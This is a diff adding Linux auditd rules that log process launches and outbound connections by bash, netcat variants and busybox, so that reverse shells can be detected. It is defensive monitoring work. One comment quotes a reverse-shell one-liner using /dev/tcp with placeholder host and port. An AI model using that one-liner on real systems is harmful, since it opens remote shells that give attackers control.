@@ -1,0 +1,46 @@
+## ------------ Reverse Shell Detection: netcat + bash ------------
+## Focus on human users; adjust/remove these two lines if you want EVERYTHING
+-a always,exit -F arch=b64 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/bash -k revshell_bash_exec
+-a always,exit -F arch=b32 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/bash -k revshell_bash_exec
+
+## netcat / ncat / netcat.openbsd (keep only the paths you have)
+-a always,exit -F arch=b64 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/nc   -k revshell_nc_exec
+-a always,exit -F arch=b32 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/nc   -k revshell_nc_exec
+
+-a always,exit -F arch=b64 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/bin/nc       -k revshell_nc_exec
+-a always,exit -F arch=b32 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/bin/nc       -k revshell_nc_exec
+
+-a always,exit -F arch=b64 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/ncat -k revshell_nc_exec
+-a always,exit -F arch=b32 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/ncat -k revshell_nc_exec
+
+-a always,exit -F arch=b64 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/netcat -k revshell_nc_exec
+-a always,exit -F arch=b32 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/usr/bin/netcat -k revshell_nc_exec
+
+## Busybox's nc (optional; comment out if not relevant)
+-a always,exit -F arch=b64 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/bin/busybox -k revshell_busybox_exec
+-a always,exit -F arch=b32 -S execve -F uid>=1000 -F uid!=4294967295 -F exe=/bin/busybox -k revshell_busybox_exec
+
+## ----- Network connect() calls made by suspicious processes -----
+## This specifically catches the moment a reverse shell dials out.
+
+# bash using /dev/tcp (reverse shells like: bash -i >& /dev/tcp/X/Y 0>&1)
+-a always,exit -F arch=b64 -S connect -F exe=/usr/bin/bash -k revshell_bash_net
+-a always,exit -F arch=b32 -S connect -F exe=/usr/bin/bash -k revshell_bash_net
+
+# netcat variants dialing out
+-a always,exit -F arch=b64 -S connect -F exe=/usr/bin/nc     -k revshell_nc_net
+-a always,exit -F arch=b32 -S connect -F exe=/usr/bin/nc     -k revshell_nc_net
+-a always,exit -F arch=b64 -S connect -F exe=/bin/nc         -k revshell_nc_net
+-a always,exit -F arch=b32 -S connect -F exe=/bin/nc         -k revshell_nc_net
+-a always,exit -F arch=b64 -S connect -F exe=/usr/bin/ncat   -k revshell_nc_net
+-a always,exit -F arch=b32 -S connect -F exe=/usr/bin/ncat   -k revshell_nc_net
+-a always,exit -F arch=b64 -S connect -F exe=/usr/bin/netcat -k revshell_nc_net
+-a always,exit -F arch=b32 -S connect -F exe=/usr/bin/netcat -k revshell_nc_net
+
+# busybox nc outbound connect
+-a always,exit -F arch=b64 -S connect -F exe=/bin/busybox    -k revshell_busybox_net
+-a always,exit -F arch=b32 -S connect -F exe=/bin/busybox    -k revshell_busybox_net
+
+## (Optional) record when netcat is launched with inherited TTY (less stealthy)
+## -w PATH watches are simple and high-volume; keep only if you want very broad exec logging.
+## -w /usr/bin/nc -p x -k revshell_nc_watch
